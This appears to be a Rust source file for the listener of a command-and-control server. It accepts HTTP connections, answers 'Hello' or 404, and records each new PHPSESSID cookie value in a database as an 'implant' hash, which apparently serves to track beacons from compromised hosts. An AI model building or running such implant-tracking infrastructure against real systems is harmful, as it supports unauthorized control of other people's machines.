extern crate regex;

use lazy_static::lazy_static;
use std::string::FromUtf8Error;
use regex::bytes::{Captures, Match};
use std::io;
use std::str;
use std::io::prelude::*;
use std::net::TcpListener;
use std::net::TcpStream;
use regex::bytes::Regex;

use crate::settings;
use crate::database;

lazy_static!
{
    static ref CONFIG: settings::Settings =
        settings::Settings::new().unwrap();
}

fn handle_connection(mut stream: TcpStream, listener_id: u16)
{
    // Read the first 1024 bytes of data from the stream
    let mut buffer: [u8; 1024] = [0; 1024];
    stream.read(&mut buffer).unwrap();

    let get: &[u8; 16] = b"GET / HTTP/1.1\r\n";
    let re = Regex::new(r"Cookie: PHPSESSID=([a-f0-9A-F]*)").unwrap();

    // Respond with greetings or a 404,
    // depending on the data in the request
    let (status_line, filename) = if buffer.starts_with(get)
    {
        ("HTTP/1.1 200 OK\r\n\r\n", "Hello")
    } else {
        ("HTTP/1.1 404 NOT FOUND\r\n\r\n", "Not found")
    };
    let contents: &str = filename;

    let caps: Option<Captures> = re.captures(&buffer);

    if caps.is_some()
    {
        let capture_match: Option<Match> = caps.unwrap().get(1);
        if capture_match.is_some()
        {
            let cookie_indexes: Match = capture_match.unwrap();
            let cookie: Vec<u8> = buffer[cookie_indexes.start()..cookie_indexes.end()].to_vec();
            let cookie_str: Result<String, FromUtf8Error> = String::from_utf8(cookie);

            if cookie_str.is_ok()
            {
                let implant_cookie_hash: String = cookie_str.unwrap();

                if ! database::check_if_implant_in_db(&implant_cookie_hash)
                {
                    println!("[+] Adding to database implant with hash: {}\n", implant_cookie_hash);

                    if database::insert_implant(listener_id, &implant_cookie_hash)
                    {
                        println!("[+] Implant successfully added to the database");
                    }
                    else
                    {
                        println!("[!] Failed to add the implant to the database");
                    }
                }
            }
        }
    }

    // Write response back to the stream,
    // and flush the stream to ensure the response is sent back to the client
    let response: String = format!("{status_line}{contents}");
    stream.write_all(response.as_bytes()).unwrap();
    stream.flush().unwrap();
}

pub fn start_listener(listener_id: u16)
{
    let address: String;
    let port: u16;

    address = crate::database::get_listener_address(listener_id);
    port = crate::database::get_listener_port(listener_id);

    let bind_address: String = String::from(&format!(
        "{}:{}",
        address, port
    ));

    let bind_result: Result<TcpListener, io::Error> = TcpListener::bind(bind_address);
    if bind_result.is_err()
    {
        println!("\n[!] Couldn't bind the listener to the specified address");
        println!("[!] Is it already in use?");
    }
    else
    {
        let listener: TcpListener = bind_result.unwrap();
        for stream in listener.incoming()
        {
            match stream {
                Ok(s) =>
                {
                    // do something with the TcpStream
                    handle_connection(s, listener_id);
                }
                Err(ref e) if e.kind() == io::ErrorKind::WouldBlock =>
                {
                    break;
                }
                Err(e) => panic!("encountered IO error: {}", e),
            }
        }
    }
}
